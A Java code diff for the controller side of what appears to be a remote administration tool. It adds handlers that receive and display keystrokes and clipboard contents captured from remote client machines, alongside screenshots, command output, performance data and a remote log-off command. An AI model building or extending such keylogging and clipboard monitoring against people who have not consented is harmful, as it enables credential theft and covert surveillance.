@@ -1,13 +1,11 @@
 package Server;
 
-import Hardware.CPU_Usage;
 import Server.Exception.ClientDisconnectedException;
 import Server.GUI.*;
 import Ultils.MessageType;
 import Ultils.NetUtils;
 import Ultils.Packet;
 import org.jfree.data.time.DynamicTimeSeriesCollection;
-import org.jfree.data.time.Second;
 
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
@@ -17,11 +15,8 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketException;
-import java.text.NumberFormat;
-import java.time.LocalDateTime;
-import java.time.ZoneId;
+import java.util.ArrayList;
 import java.util.Base64;
-import java.util.Date;
 
 import javax.imageio.ImageIO;
 
@@ -36,9 +31,9 @@ public class ConnectedClient{
 
     // GUIs
     private GuiDesktop desktop;
-    private GuiKeyLogger keylogger;
+    private Gui_Keylogger keylogger;
     private GuiCommand command;
-    private GuiCPU cpu;
+    private Gui_Performance performance;
     private Gui_HardwareInfo hardwareInfo;
 
     public DynamicTimeSeriesCollection[] connectedTimeSeries = new DynamicTimeSeriesCollection[2];
@@ -76,22 +71,11 @@ public class ConnectedClient{
                     this.os = packet.data.get(0);
                     this.userName = packet.data.get(1);
                     Server.getInstance().getGUI().updateInfo();
-
-                } else if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
-                    System.out.println(packet.data);
-                    if (cpu == null) {
-                        cpu = new GuiCPU(this);
-                    }
-                    if (this.cpu.isActive()) {
-                       System.out.println(packet.data);
-                    }
-
-
                 } else if (packet.action == MessageType.COMMAND.getID()) {
                     if (command == null) {
                         command = new GuiCommand(this);
                     }
-                    if (this.command.isActive()) {
+                    if (this.command.isVisible() || this.command.isActive()) {
                         System.out.println("packet:" + packet.data);
                         if (packet.data != null) {
                             command.AddTextToArea(packet.data.get(1));
@@ -102,12 +86,35 @@ public class ConnectedClient{
                         desktop = new GuiDesktop(this);
                     }
                     if (this.desktop.isActive()) {
-                        byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
+                        byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0));
                         ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
                         BufferedImage i = ImageIO.read(bais);
                         if (i != null) {
                             this.desktop.setImage(i);
                         }
+                    }
+                } else if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
+                    if (performance == null) {
+                        performance = new Gui_Performance(this);
+                    }
+                    if (this.performance.isActive() && this.performance.isVisible()) {
+                        System.out.println("Performance received: " + packet.data);
+                        if (packet.data != null) {
+                            if (packet.data.get(0).equals("cpu")) {
+                                performance.setCpu(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("ram")) {
+                                performance.setRAM(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("disk")) {
+                                performance.setDisk(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("process")) {
+                                performance.setProcess(packet.data.get(1));
+                            }
+                        }
+                    } else {
+                        sendStopPerformanceTrack(this.getPrintWriter());
                     }
                 } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
                     if (hardwareInfo == null) {
@@ -116,7 +123,6 @@ public class ConnectedClient{
                     if (this.hardwareInfo.isActive()) {
                         System.out.println("Hardware info received: " + packet.data);
                         if (packet.data != null) {
-                            String data;
                             if (packet.data.get(0).equals("cpu")) {
                                 hardwareInfo.SetCPUText(packet.data.get(1));
                             }
@@ -141,8 +147,26 @@ public class ConnectedClient{
                         }
                     }
                 } else if (packet.action == MessageType.KEYLOGGER.getID()) {
-                    if (keylogger != null) {
-                        keylogger.addKey(packet.data.get(0));
+                    System.out.println("Received keylogger data: " + packet.data );
+                    if (keylogger == null) {
+                        keylogger = new Gui_Keylogger(this);
+                    }
+                    if (keylogger.isActive() || keylogger.isVisible()) {
+                        System.out.println("Keylogger data received" + packet.data);
+                        if (packet.data != null) {
+                            keylogger.jTextAreaKeyLogger.setText(packet.data.get(0));
+                        }
+                    }
+                } else if (packet.action == MessageType.CLIPBOARD.getID()) {
+                    System.out.println("Received clipboard data: " + packet.data);
+                    if (keylogger == null) {
+                        this.keylogger = new Gui_Keylogger(this);
+                    }
+                    if (keylogger.isActive() || keylogger.isVisible()) {
+                        System.out.println("Clipboard data received" + packet.data);
+                        if (packet.data != null) {
+                            keylogger.jTextAreaClipboard.setText(packet.data.get(0));
+                        }
                     }
                 }
             } catch (ClientDisconnectedException e) {
@@ -167,7 +191,7 @@ public class ConnectedClient{
 
     public void OpenKeyLogView() {
         if (this.keylogger == null) {
-            this.keylogger = new GuiKeyLogger(this);
+            this.keylogger = new Gui_Keylogger(this);
         }
         this.keylogger.setVisible(true);
     }
@@ -179,11 +203,11 @@ public class ConnectedClient{
         this.command.setVisible(true);
     }
 
-    public void OpenCpuView() {
-        if (this.cpu == null) {
-            this.cpu = new GuiCPU(this);
+    public void OpenPerformanceView() {
+        if (this.performance == null) {
+            this.performance = new Gui_Performance(this);
         }
-        this.cpu.setVisible(true);
+        this.performance.setVisible(true);
     }
 
     public void OpenHardwareInfoView() {
@@ -202,7 +226,27 @@ public class ConnectedClient{
         }
     }
 
+    public void SendLogOff(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.LOGOFF.getID();
+        try {
+            NetUtils.sendMessage(packet, pw);
+        } catch (Exception e) {
+            System.out.println("Cannot send log off packet");
+        }
+    }
 
+    public void sendStopPerformanceTrack(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.PERFORMANCE_TRACK.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("stop");
+        try {
+            NetUtils.sendMessage(packet, pw);
+        } catch (Exception e){
+            System.out.println("Failed to send stop performance tracking packet");
+        }
+    }
     public PrintWriter getPrintWriter() {
         return this.pw;
     }
